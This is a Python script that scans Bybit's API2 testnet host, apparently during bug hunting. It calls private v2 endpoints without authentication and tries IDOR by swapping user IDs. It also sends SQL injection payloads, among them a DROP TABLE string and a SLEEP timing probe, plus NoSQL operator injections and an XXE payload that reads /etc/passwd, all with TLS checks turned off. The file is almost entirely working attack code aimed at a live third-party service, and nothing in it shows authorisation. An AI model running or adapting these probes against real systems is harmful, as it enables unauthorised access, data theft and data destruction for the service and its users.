#!/usr/bin/env python3
"""
Deep test of API2 - found it's accessible!
Check for IDOR, injection, auth bypass
"""
import requests
import json

requests.packages.urllib3.disable_warnings()

api2 = "https://api2-testnet.bybit.com"

print("="*80)
print("DEEP TESTING API2 - FOUND ACCESSIBLE ENDPOINT!")
print("="*80)

# Extract all API paths from chunk_7953.js
api_paths_from_js = [
    "/v2/private/user/profile",
    "/v2/public/metrics",
    "/v2/private/wallet/balance",
    "/v2/private/order/list",
    "/v2/private/order/create",
    "/v2/private/position/list",
    "/v2/private/trade/execution/list",
    "/v2/public/symbols",
    "/v2/public/tickers",
    "/v2/public/trading-records",
]

print("\n[1] TESTING ALL v2 ENDPOINTS FROM JS")
print("-"*80)

for path in api_paths_from_js:
    url = api2 + path
    try:
        # GET request
        r = requests.get(url, timeout=5, verify=False)
        print(f"\nGET {path}")
        print(f"  Status: {r.status_code}")
        
        if r.status_code == 200:
            data = r.json()
            print(f"  ✓ Response: {json.dumps(data)[:200]}")
            
            # Check if it returns data without auth
            if 'result' in data and data.get('result'):
                print(f"  🚨 RETURNS DATA WITHOUT AUTH!")
                print(f"  Full response: {json.dumps(data, indent=2)}")
                
        elif r.status_code == 500:
            print(f"  ⚠️  500 Error: {r.text[:200]}")
            
        # Try POST
        r2 = requests.post(url, json={}, timeout=5, verify=False)
        if r2.status_code != r.status_code:
            print(f"  POST returns different: {r2.status_code}")
            
    except Exception as e:
        print(f"  Error: {str(e)[:100]}")

# Test 2: IDOR - Try to access user data with manipulated parameters
print("\n\n[2] TESTING IDOR WITH PARAMETER MANIPULATION")
print("-"*80)

idor_tests = [
    ("/v2/private/user/profile", {"user_id": "1"}),
    ("/v2/private/user/profile", {"uid": "1"}),
    ("/v2/private/user/profile", {"uid": "999999"}),
    ("/v2/private/wallet/balance", {"user_id": "1"}),
    ("/v2/private/wallet/balance", {"uid": "999999"}),
]

for path, params in idor_tests:
    url = api2 + path
    try:
        # Try GET with params
        r = requests.get(url, params=params, timeout=5, verify=False)
        print(f"\nGET {path} with {params}")
        print(f"  Status: {r.status_code}")
        
        if r.status_code == 200:
            data = r.json()
            # Check if error changes
            if data.get('ret_code') != 10007:  # 10007 = auth failed
                print(f"  ⚠️  Different error code: {data.get('ret_code')}")
                print(f"  Response: {json.dumps(data)[:300]}")
                
        # Try POST with params
        r2 = requests.post(url, json=params, timeout=5, verify=False)
        if r2.status_code == 200:
            data2 = r2.json()
            if data2.get('ret_code') != 10007:
                print(f"  🚨 POST with params returns: {json.dumps(data2)[:300]}")
                
    except Exception as e:
        pass

# Test 3: SQL injection in parameters
print("\n\n[3] TESTING SQL INJECTION IN PARAMETERS")
print("-"*80)

sqli_payloads = [
    "1' OR '1'='1",
    "1' AND SLEEP(5)--",
    "1'; DROP TABLE users--",
    {"uid": {"$ne": None}},
    {"uid": {"$gt": ""}},
]

test_paths = ["/v2/private/user/profile", "/v2/private/wallet/balance"]

for path in test_paths:
    for payload in sqli_payloads:
        url = api2 + path
        try:
            if isinstance(payload, dict):
                r = requests.post(url, json=payload, timeout=8, verify=False)
            else:
                r = requests.get(url, params={"uid": payload}, timeout=8, verify=False)
            
            # Check for SQL errors
            if any(x in r.text.lower() for x in ['syntax', 'mysql', 'sql', 'exception', 'error in']):
                print(f"\n🚨 SQL ERROR DETECTED!")
                print(f"  Path: {path}")
                print(f"  Payload: {payload}")
                print(f"  Response: {r.text[:400]}")
                
        except requests.Timeout:
            print(f"\n⏱️  TIMEOUT on {path} with payload: {payload}")
            print(f"  Possible time-based SQL injection!")
        except:
            pass

# Test 4: XXE on API2
print("\n\n[4] TESTING XXE ON API2")
print("-"*80)

xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""

for path in api_paths_from_js[:5]:
    url = api2 + path
    try:
        r = requests.post(url, data=xxe_payload, 
                         headers={"Content-Type": "application/xml"}, 
                         timeout=5, verify=False)
        
        if "root:" in r.text or "/bin/" in r.text:
            print(f"\n🚨🚨🚨 XXE VULNERABILITY FOUND!")
            print(f"  Path: {path}")
            print(f"  Response: {r.text[:500]}")
            
        if r.status_code == 500:
            print(f"\n⚠️  {path} returns 500 on XML - might be vulnerable")
            
    except:
        pass

print("\n" + "="*80)
print("API2 DEEP SCAN COMPLETE")
print("="*80)
